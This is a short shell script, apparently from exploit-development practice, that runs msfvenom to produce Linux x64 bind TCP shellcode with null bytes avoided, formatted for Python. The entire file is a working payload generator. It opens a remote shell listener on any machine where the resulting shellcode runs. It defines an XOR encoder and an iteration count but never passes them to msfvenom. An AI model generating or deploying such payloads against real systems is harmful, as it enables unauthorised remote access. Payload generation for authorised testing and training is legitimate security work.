#!/bin/sh

PLATFROM="linux"
ARCH="x64"
ENCODER="$ARCH/xor"
PAYLOAD="$PLATFROM/$ARCH/shell/bind_tcp"
ITERATIONS=3
BAD_CHARS="\\x00"
FORMAT="python"

msfvenom \
    --platform   $PLATFROM   \
    --arch       $ARCH       \
    --payload    $PAYLOAD    \
    --bad-chars  $BAD_CHARS  \
    --format     $FORMAT
